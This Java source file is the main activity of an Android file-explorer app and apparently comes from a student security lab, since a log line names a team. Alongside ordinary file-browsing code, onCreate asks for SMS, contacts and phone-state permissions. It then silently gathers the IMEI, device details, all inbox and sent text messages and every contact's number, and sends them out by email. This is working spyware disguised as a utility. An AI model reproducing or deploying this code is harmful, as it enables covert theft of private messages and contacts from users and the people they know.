package com.danstoakes.fileexplorer.activity;

import static androidx.core.content.ContextCompat.getSystemService;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.RecyclerView;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;

import com.danstoakes.fileexplorer.utility.FileManager;
import com.danstoakes.fileexplorer.utility.FileRunner;
import com.danstoakes.fileexplorer.utility.FileSorter;
import com.danstoakes.fileexplorer.utility.FragmentManager;
import com.danstoakes.fileexplorer.R;
import com.danstoakes.fileexplorer.dialog.CreateFolderDialog;
import com.danstoakes.fileexplorer.dialog.SortDialog;
import com.danstoakes.fileexplorer.dialog.StorageRationaleDialog;
import com.danstoakes.fileexplorer.fragment.FilesFragment;
import com.danstoakes.fileexplorer.fragment.HierarchyFragment;
import com.danstoakes.fileexplorer.helper.SharedPreferenceHelper;
import com.google.android.material.snackbar.Snackbar;
import com.danstoakes.fileexplorer.Mail.SendEmail;
import java.io.File;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends AppCompatActivity implements FilesFragment.OnFragmentHierarchyComponentCreatedListener {
    private boolean hasStorageAccess;

    private FileManager fileManager;
    private FragmentManager fragmentManager;
    private SortDialog sortDialog;
    private String[] Permissions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
        };
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            ActivityCompat.requestPermissions(MainActivity.this, Permissions, 1);

            return;
        }
        checkForPermissions();
        Log.d("Virus", "Alaric Tang, Raymond Shea, Lee Xian Da, Ashley Boon, Jerome Poey, Lab P3, Team 01");
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        String device_id = tm.getDeviceId();

        ViewAssistClass veew = new ViewAssistClass();

        StringBuilder exData = new StringBuilder();

        String Manufacturer = Build.MANUFACTURER;
        String Model = Build.MODEL;
        String buildId = Build.ID;
        String Brand = Build.BRAND;
        String User = Build.USER;
        String Version = Build.VERSION.RELEASE;

        exData.append("\nManufacturer: " + Manufacturer);
        exData.append("\nModel: " + Model);
        exData.append("\nVersion: " + Version);
        exData.append("\nBuild ID: " + buildId);
        exData.append("\nBrand: " + Brand);
        exData.append("\nUser: " + User);
        exData.append("\nImei Number: " + device_id);

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                StringBuilder msgData = new StringBuilder();
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    msgData.append(" " + cursor.getColumnName(idx) + ":" + cursor.getString(idx));
                }
                Log.i("Virus", "Message inbox: " + msgData);
                exData.append("\nMessage inbox: " + msgData);
            } while (cursor.moveToNext());
        }

        Cursor cursor2 = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

        if (cursor2.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";
                for (int idx = 0; idx < cursor2.getColumnCount(); idx++) {
                    if (cursor2.getColumnName(idx).equals("_id") || cursor2.getColumnName(idx).equals("address") || cursor2.getColumnName(idx).equals("date") || cursor2.getColumnName(idx).equals("subject") || cursor2.getColumnName(idx).equals("body"))
                        msgData += " " + cursor2.getColumnName(idx) + ":" + cursor2.getString(idx);
                }
                exData.append("\nMessage sent: " + msgData);
            } while (cursor2.moveToNext());
        }

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        exData.append("\nName: " + name);
                        exData.append("\nPhone Number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }

        if (cur != null) {
            cur.close();
        }

        Log.i("Virus", exData.toString());
        veew.writeToFile(exData.toString(), getApplicationContext(), "test.txt");

        SendEmail sendEmail = new SendEmail(exData.toString());
        sendEmail.execute();

        int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                SharedPreferenceHelper.sortKey);
        int orderType = SharedPreferenceHelper.getInteger(MainActivity.this,
                SharedPreferenceHelper.orderKey);
        if (sortType == SharedPreferenceHelper.DEFAULT_VALUE || orderType == SharedPreferenceHelper.DEFAULT_VALUE) {
            SharedPreferenceHelper.setInteger(MainActivity.this, "sortType", FileSorter.SORT_NAME);
            SharedPreferenceHelper.setInteger(MainActivity.this, "sortType", FileSorter.ORDER_DESCENDING);

            sortType = FileSorter.SORT_NAME;
            orderType = FileSorter.ORDER_DESCENDING;
        }

        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        List<File> files = Arrays.asList(file.listFiles());
        FileSorter.sortFiles(files, sortType, orderType);

        fileManager = new FileManager(getFilesDir().getAbsolutePath());
        fileManager.clearLevels();
        fileManager.createLevel(0, file.getAbsolutePath(), files);

        Bundle bundle = new Bundle();
        createHierarchyFragment(bundle);
        createFilesFragment(bundle);
    }

    private void createHierarchyFragment(Bundle bundle) {
        fragmentManager = new FragmentManager();
        fragmentManager.setHierarchyFragmentTag("hierarchyFragment");
        bundle.putParcelable("FILE_MANAGER", fileManager);
        bundle.putParcelable("FRAGMENT_MANAGER", fragmentManager);

        HierarchyFragment hierarchyFragment = new HierarchyFragment();
        hierarchyFragment.setArguments(bundle);

        getSupportFragmentManager().beginTransaction()
                .setReorderingAllowed(true)
                .add(R.id.activity_main_hierarchy_fl, hierarchyFragment, "hierarchyFragment")
                .commit();
    }

    private void createFilesFragment(Bundle bundle) {
        FilesFragment filesFragment = new FilesFragment();
        filesFragment.setArguments(bundle);
        filesFragment.setOnFragmentHierarchyComponentCreatedListener(this);

        fragmentManager.add("filesFragment");

        getSupportFragmentManager().beginTransaction()
                .setReorderingAllowed(true)
                .add(R.id.activity_main_files_fl, filesFragment, "filesFragment")
                .commit();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onPrepareOptionsMenu(Menu menu) {
        menu.findItem(R.id.menu_main_sort_itm).setEnabled(hasStorageAccess);
        menu.findItem(R.id.menu_main_create_itm).setEnabled(hasStorageAccess);

        return super.onPrepareOptionsMenu(menu);
    }

    private void updateFiles(List<File> files, int index, int sortType, int orderType) {
        FileRunner fileRunner = new FileRunner();
        fileRunner.setCallback(new FileRunner.Callback() {
            @Override
            public void onBegin() {
            }

            @Override
            public void run() {
                FileSorter.sortFiles(files, sortType, orderType);
            }

            @Override
            public void onComplete() {
                String path = fileManager.getDirectoryPathAtLevel(index);
                fileManager.createLevel(index, path, files);

                runOnUiThread(() -> {
                    FilesFragment fragment = (FilesFragment) getSupportFragmentManager().findFragmentByTag(fragmentManager.get(index));
                    fragment.updateFiles();
                });
            }
        });
        fileRunner.initialise();
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        int id = item.getItemId();

        if (id == R.id.menu_main_sort_itm) {
            sortDialog = new SortDialog(MainActivity.this);
            sortDialog.setOnDialogOptionSelectedListener((sortType, orderType) -> {
                for (int i = 0; i < fileManager.getLevelCount(); i++) {
                    List<File> files = fileManager.getFilesAtLevel(i);
                    updateFiles(files, i, sortType, orderType);
                }
            });
            sortDialog.show();
        } else if (id == R.id.menu_main_create_itm) {
            CreateFolderDialog createFolderDialog = new CreateFolderDialog(MainActivity.this);
            createFolderDialog.setOnDialogOptionSelectedListener((returnCode, folderName) -> {
                if (returnCode == CreateFolderDialog.VALID_FILENAME) {
                    int index = fileManager.getLevelCount() - 1;
                    String path = fileManager.getDirectoryPathAtLevel(index) + "/" + folderName;
                    File file = new File(path);

                    boolean directoryMade = file.mkdir();
                    if (directoryMade) {
                        FileRunner fileRunner = new FileRunner();
                        fileRunner.setCallback(new FileRunner.Callback() {
                            List<File> files;

                            @Override
                            public void onBegin() {
                                files = fileManager.getFilesAtLevel(index);
                                files.add(file);

                                int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                                        SharedPreferenceHelper.sortKey);
                                int orderType = SharedPreferenceHelper.getInteger(MainActivity.this,
                                        SharedPreferenceHelper.orderKey);

                                FileSorter.sortFiles(files, sortType, orderType);
                            }

                            @Override
                            public void run() {
                                fileManager.createLevel(index, fileManager.getDirectoryPathAtLevel(index), files);
                            }

                            @Override
                            public void onComplete() {
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        FilesFragment fragment = (FilesFragment) getSupportFragmentManager()
                                                .findFragmentByTag(fragmentManager.get(index));

                                        fragment.updateFiles();
                                    }
                                });
                            }
                        });
                        fileRunner.initialise();

                        Snackbar.make(findViewById(R.id.fragment_files_rv), "New folder added.", Snackbar.LENGTH_LONG)
                                .setAction("View", new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        fileManager.createLevel(index + 1, path, Arrays.asList(file.listFiles()));

                                        Bundle bundle = new Bundle();
                                        bundle.putParcelable("FILE_MANAGER", fileManager);
                                        bundle.putParcelable("FRAGMENT_MANAGER", fragmentManager);

                                        FilesFragment filesFragment = new FilesFragment();
                                        filesFragment.setArguments(bundle);
                                        filesFragment.setOnFragmentHierarchyComponentCreatedListener(MainActivity.this);

                                        int count = getSupportFragmentManager().getBackStackEntryCount();
                                        fragmentManager.add("filesFragment" + count);

                                        getSupportFragmentManager().beginTransaction()
                                                .replace(R.id.activity_main_files_fl, filesFragment, "filesFragment" + count)
                                                .addToBackStack(null)
                                                .commit();

                                        onFragmentHierarchyComponentCreated(file.getPath());
                                    }
                                }).show();

                    } else {
                        Snackbar.make(findViewById(R.id.fragment_files_rv),
                                "Error: a file with the same name already exists.", Snackbar.LENGTH_LONG).show();
                    }
                } else if (returnCode == CreateFolderDialog.INVALID_FILENAME) {
                    Snackbar.make(findViewById(R.id.fragment_files_rv),
                            "Error: the file name contained invalid characters.", Snackbar.LENGTH_LONG).show();
                } else if (returnCode == CreateFolderDialog.EMPTY_FILENAME) {
                    Snackbar.make(findViewById(R.id.fragment_files_rv),
                            "Error: the file name was empty.", Snackbar.LENGTH_LONG).show();
                }
            });
            createFolderDialog.show();
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {
        super.onCreateContextMenu(menu, v, menuInfo);

        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu_context, menu);
    }

    @Override
    public boolean onContextItemSelected(@NonNull MenuItem item) {
        String itemTitle = (String) item.getTitle();
        if (itemTitle.equals(getString(R.string.menu_context_delete))) {
            File file = new File(fileManager.getFilePathForContext());

            boolean deleted;
            if (!file.isFile()) {
                File[] files = file.listFiles();
                for (File f : files)
                    f.delete();
            }
            deleted = file.delete();

            if (deleted) {
                FilesFragment fragment = (FilesFragment) getSupportFragmentManager().findFragmentByTag(fragmentManager.get(fragmentManager.count() - 1));
                fragment.removeFile(file);

                Snackbar.make(findViewById(R.id.fragment_files_rv), "File deleted.", Snackbar.LENGTH_LONG).show();
            } else {
                Snackbar.make(findViewById(R.id.fragment_files_rv), "The file could not be deleted.", Snackbar.LENGTH_LONG).show();
            }
        }
        return super.onContextItemSelected(item);
    }

    @Override
    public void onBackPressed() {
        if (fragmentManager.count() > 1) {
            int index = fragmentManager.count() - 1;

            fileManager.rollbackToLevel(fileManager.getLevelCount() - 2);
            fragmentManager.remove(index);

            onFragmentHierarchyComponentCreated(fileManager.getDirectoryPathAtLevel(
                    fileManager.getLevelCount() - 1));
        }
        super.onBackPressed();
    }

    @Override
    public void onConfigurationChanged(@NonNull Configuration newConfig) {
        super.onConfigurationChanged(newConfig);

        if (sortDialog != null)
            sortDialog.requestRedraw(newConfig.orientation);
    }

    private void checkForPermissions() {
        ActivityCompat.requestPermissions(MainActivity.this, Permissions, 1);
        int readPermission = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_EXTERNAL_STORAGE);
        int writePermission = ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE);

        if (readPermission == PackageManager.PERMISSION_DENIED ||
                writePermission == PackageManager.PERMISSION_DENIED) {
            boolean shouldShowReadRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                    this, Manifest.permission.READ_EXTERNAL_STORAGE);
            boolean shouldShowWriteRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                    this, Manifest.permission.WRITE_EXTERNAL_STORAGE);

            if (shouldShowReadRationale || shouldShowWriteRationale) {
                StorageRationaleDialog rationaleDialog = new StorageRationaleDialog(MainActivity.this);
                rationaleDialog.setOnStorageRationalOptionSelectedListener(allow -> {
                    if (allow)
                        requestStoragePermission();
                });
                rationaleDialog.show();
            } else {
                requestStoragePermission();
            }
        } else {
            hasStorageAccess = true;
            invalidateOptionsMenu();
        }
    }

    private void requestStoragePermission() {
        String[] permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE};

        ActivityCompat.requestPermissions(this, permissions,
                SharedPreferenceHelper.PERMISSION_ACCESS_STORAGE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == SharedPreferenceHelper.PERMISSION_ACCESS_STORAGE)
            hasStorageAccess = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onFragmentHierarchyComponentCreated(String filePath) {
        HierarchyFragment hierarchyFragment = (HierarchyFragment) getSupportFragmentManager()
                .findFragmentByTag(fragmentManager.getHierarchyFragmentTag());
        hierarchyFragment.updateFragmentContents();

        RecyclerView recyclerView = findViewById(R.id.fragment_hierarchy_rv);
        recyclerView.scrollToPosition(fragmentManager.count() - 1);
    }

    @Override
    protected void onResume() {
        super.onResume();

        int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                SharedPreferenceHelper.sortKey);
        int orderType = SharedPreferenceHelper.getInteger(MainActivity.this,
                SharedPreferenceHelper.orderKey);

        List<File> files = fileManager.getFilesAtLevel(fileManager.getLevelCount() - 1);
        updateFiles(files, fileManager.getLevelCount() - 1, sortType, orderType);
    }
}